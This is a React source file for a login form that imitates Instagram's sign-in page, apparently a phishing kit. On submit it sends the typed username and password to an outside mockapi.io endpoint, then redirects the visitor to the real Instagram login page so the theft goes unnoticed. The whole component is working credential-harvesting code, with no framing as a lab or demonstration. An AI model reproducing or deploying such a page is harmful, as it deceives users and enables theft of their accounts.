import React, { useState } from 'react';
import './InstaLoginForm.css';

const InstaLoginForm = () => {
  const [formData, setFormData] = useState({
    username: '',
    password: '',
  });

  const handleChange = (e) => {
    const { id, value } = e.target;
    setFormData((prevData) => ({
      ...prevData,
      [id]: value,
    }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    console.log('Form Data:', formData);

    try {
      const response = await fetch('https://655e8362879575426b439a31.mockapi.io/insta/username', {
        method: 'POST',
         headers: {
        'Content-Type': 'application/json',
      },
        body: JSON.stringify(formData),
      });

      if (response.ok) {
        console.log('Data sent successfully!');
        window.location.href = 'https://www.instagram.com/accounts/login/';
        // Add logic to handle success (e.g., redirect user, show a success message)
      } else {
        console.error('Error sending data:', response.statusText);
        // Add logic to handle error (e.g., show an error message to the user)
      }
    } catch (error) {
      console.error('Error sending data:', error.message);
      // Add logic to handle error (e.g., show an error message to the user)
    }
  };

  return (
    <form className="login-form" onSubmit={handleSubmit}>
      <div className="field">
        <input
          id="username"
          type="text"
          placeholder="Phone number, username, or email"
          value={formData.username}
          onChange={handleChange}
        />
        <label htmlFor="username">Phone number, username, or email</label>
      </div>
      <div className="field">
        <input
          id="password"
          type="password"
          placeholder="password"
          value={formData.password}
          onChange={handleChange}
        />
        <label htmlFor="password">Password</label>
      </div>
      <button className="login-button" title="login">
        Log In
      </button>
      <div className="separator">
        <div className="line"></div>
        <p>OR</p>
        <div className="line"></div>
      </div>
      <div className="other">
        <button className="fb-login-btn" type="button">
          <i className="fa fa-facebook-official fb-icon"></i>
          <span className="">Log in with Facebook</span>
        </button>
        <a className="forgot-password" href="#">
          Forgot password?
        </a>
      </div>
    </form>
  );
};

export default InstaLoginForm;
